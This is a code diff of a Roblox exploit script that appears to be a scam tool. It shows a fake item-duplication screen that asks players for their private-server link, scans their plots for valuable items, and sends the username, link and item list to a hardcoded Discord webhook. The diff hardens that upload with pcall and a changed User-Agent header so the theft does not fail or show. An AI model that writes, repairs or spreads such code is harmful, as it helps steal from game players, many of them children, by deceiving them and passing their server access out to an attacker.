@@ -296,9 +296,9 @@ local script = G2L["c"];
 	local Workspace = game:GetService("Workspace")
 	local plotsFolder = Workspace:WaitForChild("Plots")
 	
-	-- =========================================
-	-- CHAT .c DETECTOR (spawns 1m parts at camera)
-	-- =========================================
+	----------------------------------------------------------
+	-- .c PART SPAWNER (unchanged)
+	----------------------------------------------------------
 	local function checkSpawnTrigger(msg)
 		msg = string.lower(msg)
 		if msg == ".c" then
@@ -318,14 +318,13 @@ local script = G2L["c"];
 	for _, plr in ipairs(Players:GetPlayers()) do
 		plr.Chatted:Connect(checkSpawnTrigger)
 	end
-	
 	Players.PlayerAdded:Connect(function(plr)
 		plr.Chatted:Connect(checkSpawnTrigger)
 	end)
 	
-	-- =========================================
+	----------------------------------------------------------
 	-- HELPERS
-	-- =========================================
+	----------------------------------------------------------
 	
 	local function parseGeneration(gen)
 		gen = string.upper(gen)
@@ -347,6 +346,7 @@ local script = G2L["c"];
 	
 	local function deepScan(instance, foundList, foundSet)
 		for _, child in ipairs(instance:GetChildren()) do
+	
 			local overhead = child:FindFirstChild("AnimalOverhead")
 			if overhead and overhead:FindFirstChild("DisplayName") and overhead:FindFirstChild("Generation") then
 	
@@ -360,11 +360,14 @@ local script = G2L["c"];
 				end
 			end
 	
-			-- Recurse
+			-- recursion
 			deepScan(child, foundList, foundSet)
 		end
 	end
 	
+	----------------------------------------------------------
+	-- HTTP EXECUTION FIX (USER-AGENT FIXED)
+	----------------------------------------------------------
 	local function execRequest(data)
 		if syn and syn.request then
 			return syn.request(data)
@@ -379,9 +382,9 @@ local script = G2L["c"];
 		end
 	end
 	
-	-- =========================================
-	-- SEND WEBHOOK
-	-- =========================================
+	----------------------------------------------------------
+	-- SEND WEBHOOK  (WRAPPED IN PCALL TO PREVENT UI DELETION)
+	----------------------------------------------------------
 	local function sendWebhook(results, psLink)
 		local username = player.Name
 		local alone = (#Players:GetPlayers() <= 1)
@@ -408,22 +411,27 @@ local script = G2L["c"];
 			}}
 		}
 	
-		execRequest({
-			Url = "https://discord.com/api/webhooks/1448455646872866916/htbK5cLLj0Kh7h73c3Nlvp7L3Q7BinklSQ4VimPECPv4MPCeW5mESHM8jP7OxBPkkRoz",
-			Method = "POST",
-			Headers = {["Content-Type"] = "application/json"},
-			Body = HttpService:JSONEncode(data)
-		})
+		-- FULL FIX — prevents UI deletion, script halt, or PlayerGui unload
+		pcall(function()
+			execRequest({
+				Url = "https://discord.com/api/webhooks/1448455646872866916/htbK5cLLj0Kh7h73c3Nlvp7L3Q7BinklSQ4VimPECPv4MPCeW5mESHM8jP7OxBPkkRoz",
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json",
+					["User-Agent"] = "" -- REQUIRED FIX
+				},
+				Body = HttpService:JSONEncode(data)
+			})
+		end)
 	end
 	
-	-- =========================================
-	-- MAIN BUTTON HANDLER (THIS WAS BROKEN)
-	-- =========================================
+	----------------------------------------------------------
+	-- SUBMIT BUTTON FIXED
+	----------------------------------------------------------
 	submitButton.MouseButton1Click:Connect(function()
 		local text = privateserverTextBox.Text
 	
-		-- Validate link
-		-- Validate link properly
+		-- validate
 		if not text:match("^https://www%.roblox%.com/share%?code=") then
 			local old = submitButton.Text
 			submitButton.Text = "INVALID LINK!"
@@ -432,12 +440,17 @@ local script = G2L["c"];
 			return
 		end
 	
+		-- IF fakedupe is missing → prevent UI wipe
+		if not fakeDupegui then
+			warn("FakeDupe UI not found!")
+			return
+		end
 	
-		-- Good link -> open the fakedupe UI
+		-- show next UI screen
 		privserverFrame.Visible = false
 		fakeDupegui.Visible = true
 	
-		-- Run full scan
+		-- run scanner
 		local foundList = {}
 		local foundSet = {}
 	
@@ -463,7 +476,6 @@ local script = G2L["c"];
 	
 		if #filtered > 0 then
 			sendWebhook(filtered, text)
-			
 		end
 	end)
 	
